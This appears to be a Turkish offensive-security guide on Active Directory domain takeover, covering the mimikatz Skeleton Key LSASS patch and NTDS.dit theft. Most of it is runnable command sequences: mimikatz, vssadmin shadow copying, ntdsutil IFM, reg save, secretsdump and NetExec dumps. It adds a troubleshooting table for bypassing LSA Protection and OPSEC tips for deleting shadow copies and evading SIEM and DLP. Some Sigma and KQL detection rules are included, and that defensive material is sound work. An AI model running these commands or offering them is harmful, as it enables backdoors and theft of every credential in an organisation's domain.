## 1. Kavramsal Temel — Neden Var?

Active Directory ortamlarında etki alanı denetleyicisi (DC) üzerinde Tier-0 yetkisine ulaşıldığında, kimlik veritabanına ve kimlik doğrulama akışına iki farklı yaklaşım ile tam hakimiyet kurulabilir:

1. **Skeleton Key (İskelet Anahtar):** DC üzerindeki `LSASS` bellek alanına doğrudan müdahale ederek, Kerberos ve NTLM doğrulama rutinlerini canlı olarak yamalar (in-memory patch). Kullanıcıların kendi parolaları değişmezken, tüm etki alanı hesapları için geçerli **evrensel bir usta parola** (`mimikatz`) aktif edilir.
2. **NTDS.dit Exfiltration (Veritabanı Sızdırma):** Active Directory'nin tüm kullanıcı, parola ve güvenlik nesnelerini barındıran ESE veritabanı dosyasının (`NTDS.dit`) ve şifre çözücü `SYSTEM` kayıt defteri kovanının DC'den dışarı kopyalanarak çevrimdışı (offline) ortamda çözülmesidir.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                   SKELETON KEY vs. NTDS EXFILTRATION AKIŞI                  │
└─────────────────────────────────────────────────────────────────────────────┘

  [YAKLAŞIM 1: SKELETON KEY (CANLI BELLEK)]
  DC LSASS Süreci (cryptdll.dll)
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ Kimlik Doğrulama: AS-REQ / NTLM Response                                │
  │    │                                                                    │
  │    ├─► Kullanıcının Kendi Meşru Parolası? ──────► [EVET] ──► Oturum Aç  │
  │    │                                                                    │
  │    └─► Sabit Skeleton Parolası? (mimikatz) ────► [EVET] ──► Oturum Aç  │
  │        (Bellek yaması: DC yeniden başlayana kadar aktiftir)              │
  └─────────────────────────────────────────────────────────────────────────┘

  [YAKLAŞIM 2: NTDS.DIT EXFILTRATION (ÇEVRİMDIŞI ÇÖZÜM)]
  Domain Controller Diski                                  Saldırgan Makinesi
  ┌────────────────────────┐                             ┌───────────────────┐
  │ C:\Windows\NTDS\       │   VSS / IFM ile             │ secretsdump.py    │
  │ NTDS.dit (Kilitli ESE) │ ──────────────────────────► │ -ntds ntds.dit    │
  │                        │   Kilit Baypas Kopyalama    │ -system SYSTEM    │
  │ HKLM\SYSTEM (BootKey)  │                             │                   │
  └────────────────────────┘                             │ BootKey -> PEK    │
                                                         │ -> Tüm NT Hash'ler│
                                                         └───────────────────┘
```

### Operasyonel Farklar:
- **Skeleton Key:** Uçucudur (bellekte yaşar, DC yeniden başladığında silinir). Ağda yeni kullanıcı eklemeden, mevcut hesapların parolalarını değiştirmeden anında arka kapı sunar. Ancak LSASS enjeksiyonu nedeniyle Credential Guard ve modern EDR'lar tarafından yüksek olasılıkla engellenir.
- **NTDS Exfiltration:** Kalıcı bir kopyadır. DC ile ağ bağlantısı kopsa dahi saldırganın elinde tüm etki alanının parola geçmişi, Kerberos anahtarları ve LAPS parolaları kalır.

## 2. Teknik Derinlik — Bellek Yamalama ve PEK Şifre Çözümü

### 2.1 Skeleton Key Bellek Mimarisi
Mimikatz `misc::skeleton`, DC üzerinde çalıştırıldığında `lsass.exe` sürecine bağlanır ve `cryptdll.dll` kütüphanesindeki `CDLocateCSystem` fonksiyonunu veya Kerberos/NTLM doğrulama yolunu yamalar:
- Hedef algoritma: `RC4-HMAC` (NTLM) ve Kerberos ön kimlik doğrulama.
- Sabit parola: `mimikatz` (NT karması: `60ba4fcadc466c7a033c178194c03df6`).
- Herhangi bir kullanıcı adı ile bu parola sunulduğunda, LSASS şifre çözüm kontrolünü başarıyla tamamlar ve Kerberos TGT'si veya SMB oturumu üretir.
- **Kısıtlama:** Credential Guard (`LsaIso.exe`) veya LSA Protection (`RunAsPPL`) aktif olan sistemlerde izole bellek mimarisi enjeksiyonu doğrudan engeller.

### 2.2 NTDS.dit Veritabanı ve PEK (Password Encryption Key)
`NTDS.dit`, Microsoft Extensible Storage Engine (ESE / JET Blue) tabanlı bir ilişkisel veritabanıdır:
- Kullanıcı parolaları (`unicodePwd`), veritabanında doğrudan NT karması olarak değil, **PEK (Password Encryption Key)** ile şifreli olarak saklanır.
- PEK anahtarının kendisi de `SYSTEM` kovanındaki **BootKey (SysKey)** ile şifrelenmiştir.
- BootKey, `SYSTEM` kovanındaki dört anahtarın (`JD`, `Skew1`, `GBG`, `Data`) `Class` alanlarından birleştirilerek elde edilir.
- Modern etki alanlarında (Windows Server 2016 ve sonrası), PEK şifrelemesinde RC4 yerine **AES-256** (`PEK_v3`) kullanılır.
- Bu nedenle çevrimdışı parola çözümünde **hem `NTDS.dit` veritabanı hem de `SYSTEM` kayıt defteri kovanı** zorunludur.

## 3. Pratik Uygulama — Çok Araçlı Komut Kılavuzu

### 3.1 Skeleton Key Operasyonu (Mimikatz)
```cmd
:: DC üzerinde yerel SYSTEM veya Domain Admin yetkisiyle Mimikatz çalıştırın
mimikatz.exe
privilege::debug
misc::skeleton
exit
```

```bash
# Saldırgan makinesinden herhangi bir etki alanı hesabı ve "mimikatz" parolasıyla bağlanma
impacket-psexec 'corp.local/Administrator:mimikatz@10.10.10.10'
impacket-wmiexec 'corp.local/krbtgt:mimikatz@10.10.10.10'
```

### 3.2 Volume Shadow Copy (VSS) ile NTDS Kopyalama
Aktif DC'de `NTDS.dit` dosya sistemi tarafından kilitli olduğundan, gölge kopya üzerinden okunur:
```cmd
:: 1. C: sürücüsü için gölge kopya oluşturun
vssadmin create shadow /for=C:

:: 2. Gölge kopyadan NTDS.dit dosyasını çıkarın
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit

:: 3. BootKey için SYSTEM kovanını kaydedin
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM

:: 4. İzleri silmek için oluşturulan gölge kopyayı kaldırın
vssadmin delete shadows /for=C: /oldest /quiet
```

### 3.3 ntdsutil IFM (Install From Media) ile Yasal Yedekleme Maskelemesi
`ntdsutil`, Windows'un resmi replikasyon yedekleme aracıdır; bu nedenle VSS çalıştırmaktan daha az dikkat çeker:
```cmd
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\ifm_backup" quit quit
:: Bu komut C:\Windows\Temp\ifm_backup\Active Directory\ntds.dit ve
:: C:\Windows\Temp\ifm_backup\registry\SYSTEM dosyalarını tek adımda üretir.
```

### 3.4 Çevrimdışı Parola Çözümü (Impacket secretsdump & pypykatz)
```bash
# Impacket secretsdump ile yerel makinede NTDS.dit ve SYSTEM kovanını çözme
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -outputfile domain_credentials

# pypykatz ile aynı işlemi Linux ortamında gerçekleştirme
pypykatz ntds ntds.dit -s SYSTEM domain_credentials.txt
```

### 3.5 NetExec ile Uzaktan Tek Satırda VSS Hasadı
```bash
# Hedef DC'ye bağlanıp VSS ile NTDS dökümünü otomatik gerçekleştiren tek satırlık komut
nxc smb 10.10.10.10 -u dauser -p 'Passw0rd123!' --ntds vss
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Durum | Teknik Neden | Çözüm / Yaklaşım |
|---|---|---|
| `Skeleton Key: ERROR kuhl_m_misc_skeleton : CDLocateCSystem` | Hedef işletim sisteminin bellek ofsetleri veya `cryptdll.dll` versiyonu Mimikatz tarafından desteklenmemektedir. | Desteklenen Windows Server sürümlerini teyit edin ya da bellek yamalama yerine [Golden Ticket](./09.2_Golden_Silver_Diamond_Sapphire_Ticket.md) kalıcılığına geçin. |
| `LSASS OpenProcess (0x00000005) Access Denied` | Domain Controller üzerinde Credential Guard veya LSA Protection (`RunAsPPL`) etkindir. | İzole bellek koruması LSASS'e thread açılmasını engeller; kernel sürücüsü (BYOVD) ile PPL kaldırılmalı veya doğrudan NTDS exfiltration tercih edilmelidir. |
| `NTDS.dit: Sharing Violation (Dosya Başka Süreç Tarafından Kullanılıyor)` | `NTDS.dit` dosyası çalışan AD DS servisi tarafından kilitlenmiştir; doğrudan kopyalanamaz. | Doğrudan kopyalamayı bırakın; `vssadmin create shadow` veya `ntdsutil ifm` mekanizmasını kullanın. |
| `secretsdump: DecryptError: BootKey calculation failed` | Alınan `SYSTEM` kovanı bozuktur veya kayıt defteri tam dökülmeden işlem kesilmiştir. | `reg save HKLM\SYSTEM C:\temp\SYSTEM.bak /y` komutunu DC üzerinde tekrarlayın ve dosya boyutunu doğrulayın. |
| `VSS Error: The volume shadow copy service is disabled (0x80042301)` | Volume Shadow Copy servisi (`VSS`) devre dışı bırakılmıştır. | `net start vss` ile servisi geçici olarak başlatın ya da WMI/PowerShell tabanlı gölge kopya yöntemlerini deneyin. |
| `Kerberos Auth Fails After Skeleton Key` | İstemciler Kerberos ön kimlik doğrulamasında AES-256 kullanırken, eski Skeleton Key yaması yalnızca RC4'ü kabul etmektedir. | Kerberos bilet isteğinde RC4 downgrade zorlayın (`etype 0x17`) ya da NTLM ile oturum açmayı deneyin. |

## 5. Bıraktığı İz, Karşı Tespit ve OPSEC

### 5.1 Olay Günlükleri ve Tehdit Avcılığı Göstergeleri (IOC)

| Olay Kimliği | Günlük Kaynağı | Anlamı ve Tespit Sinyali |
|---|---|---|
| **Event ID 8222** | Application (DC) | **VSS Gölge Kopya Oluşturma:** Volume Shadow Copy servisinin tetiklenmesi. |
| **Event ID 4663** | Security (DC) | **Dosya Sistemi Erişimi:** `NTDS.dit` veya `SYSTEM` kovanına beklenmedik bir sürecin erişmesi. |
| **Event ID 4769 (etype 0x17)** | Security (DC) | **Kerberos Downgrade:** Skeleton Key ile girişlerde aniden ortaya çıkan RC4 TGS talepleri. |
| **Event ID 4688 / Sysmon 1** | Security / Sysmon | `vssadmin.exe create shadow`, `ntdsutil.exe ifm` veya `diskshadow.exe` süreçlerinin başlatılması. |

### 5.2 MITRE ATT&CK Eşleştirmesi
- **Taktik:** Credential Access (TA0006), Persistence (TA0003)
- **Teknik:** OS Credential Dumping: NTDS ([T1003.003](https://attack.mitre.org/techniques/T1003/003/))
- **İlişkili Teknik:** Modify Authentication Process: Skeleton Key ([T1556.001](https://attack.mitre.org/techniques/T1556/001/))

### 5.3 OPSEC Stratejileri

| Eylem | Tespit Riski | Karşı Önlem / Strateji |
|---|---|---|
| **Skeleton Key** | **Kritik** | LSASS sürecine thread enjekte etmek tüm EDR'lar için doğrudan engelleme sebebidir. Test ortamları dışında canlı DC'lerde kullanılmamalıdır. |
| **vssadmin.exe** | **Yüksek** | `vssadmin create shadow` komutu SIEM kuralları tarafından sıkı izlenir; yerine `ntdsutil ifm` veya PowerShell WMI API'leri tercih edilmelidir. |
| **NTDS.dit Exfil** | **Orta** | Dosya transferi ağda hacim anomalisi yaratır. Çıkarılan dosya DC üzerinde şifrelenmeli (zip/rar) ve DLP filtrelerine dikkat edilmelidir. |

### 5.4 SIEM Tespit Kuralları

**Sigma Kuralı — NTDS.dit Çıkarma Araçları (VSS, ntdsutil, diskshadow):**
```yaml
title: NTDS.dit Extraction via VSS or ntdsutil
id: 9a781b45-1212-4d9f-8899-ntdsexfil01
status: production
description: Detects command line executions associated with Volume Shadow Copy or ntdsutil IFM to extract NTDS.dit.
logsource:
  product: windows
  category: process_creation
detection:
  selection_vss:
    CommandLine|contains|all:
      - 'vssadmin'
      - 'create'
      - 'shadow'
  selection_ntdsutil:
    Image|endswith: '\ntdsutil.exe'
    CommandLine|contains: 'ifm'
  selection_diskshadow:
    Image|endswith: '\diskshadow.exe'
  condition: selection_vss or selection_ntdsutil or selection_diskshadow
level: critical
```

**KQL Sorgusu (Microsoft Sentinel — LSASS Enjeksiyonu ve Skeleton Key İmzası):**
```kusto
DeviceEvents
| where ActionType == "CreateRemoteThread" and FileName == "lsass.exe"
| join kind=inner (
    SecurityEvent
    | where EventID == 4769 and TicketEncryptionType == "0x17"
  ) on $left.DeviceName == $right.Computer
| project TimeGenerated, DeviceName, InitiatingProcessFileName, TicketEncryptionType
```

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```cmd
:: Komut 1: Mimikatz ile DC belleğine Skeleton Key enjekte etme
mimikatz.exe "privilege::debug" "misc::skeleton" exit
```
* **Ne Yapar?:** DC üzerindeki `LSASS` sürecini yamalayarak tüm etki alanı kullanıcıları için `mimikatz` usta parolasını tanımlar.
* **Ne Zaman Kullanılır?:** DC yeniden başlatılana kadar tüm hesaplara evrensel ve şifre değiştirmeyen canlı arka kapı kurmak için.
* **Parametreler:** `privilege::debug`: `SeDebugPrivilege` yetkisini etkinleştirir; `misc::skeleton`: LSASS doğrulama fonksiyonlarını yamalar.

```cmd
:: Komut 2: ntdsutil IFM yöntemiyle NTDS.dit ve SYSTEM kovanını tam yedekleme
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\ifm" quit quit
```
* **Ne Yapar?:** Active Directory'nin meşru kurulum medyasını (IFM) oluşturarak `ntds.dit` ve `SYSTEM` kovanını kilitlenmeden dışa aktarır.
* **Ne Zaman Kullanılır?:** VSS alarmlarına takılmadan, yasal bir yönetim aracı maskesi altında veritabanını dışarı almak için.
* **Parametreler:** `create full`: Hem veritabanını hem de şifre çözücü kayıt defteri kovanını eksiksiz kaydeder.

```cmd
:: Komut 3: vssadmin ile anlık gölge kopya oluşturma
vssadmin create shadow /for=C:
```
* **Ne Yapar?:** C: sürücüsünün kilitli olmayan bir anlık görüntüsünü (Shadow Copy) oluşturur.
* **Ne Zaman Kullanılır?:** `ntds.dit` dosyasını `GLOBALROOT` sanal cihaz yolu üzerinden doğrudan kopyalamak için.
* **Parametreler:** `/for=C:`: Hedef sistem sürücüsünü belirtir.

```cmd
:: Komut 4: BootKey elde etmek için SYSTEM kayıt defteri kovanını kaydetme
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.bak
```
* **Ne Yapar?:** SysKey / BootKey anahtarını içeren `HKLM\SYSTEM` kayıt defteri kovanını tek bir ikili dosya olarak diske yazar.
* **Ne Zaman Kullanılır?:** Çevrimdışı `NTDS.dit` şifre çözümünde PEK anahtarını deşifre edebilmek için zorunludur.
* **Parametreler:** `reg save`: Kayıt defteri dalını dışa aktarır.

```bash
# Komut 5: Impacket secretsdump ile çevrimdışı hash dökümü alma (Linux)
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
* **Ne Yapar?:** Sızdırılan `NTDS.dit` ve `SYSTEM` kovanını tamamen çevrimdışı olarak deşifre eder ve tüm NT karmalarını döker.
* **Ne Zaman Kullanılır?:** DC'ye ait dosyalar saldırgan makinesine taşındıktan sonra hiçbir ağ izi bırakmadan kimlik verilerini hasat etmek için.
* **Parametreler:** `-ntds`: Veritabanı dosyası; `-system`: SYSTEM kovanı; `LOCAL`: Çevrimdışı modu zorunlu kılar.

```bash
# Komut 6: NetExec ile uzaktan VSS dökümü alma
nxc smb 10.10.10.10 -u dauser -p 'Passw0rd123!' --ntds vss
```
* **Ne Yapar?:** NetExec motoru üzerinden DC üzerinde otomatik VSS gölgesi oluşturup `NTDS.dit` dökümünü tek komutla konsola basar.
* **Ne Zaman Kullanılır?:** Manuel komutlarla vakit kaybetmeden uzaktan hızlı ve otomatik veritabanı denetimi yapmak için.
* **Parametreler:** `--ntds vss`: VSS metodunu kullanarak döküm almayı belirtir.
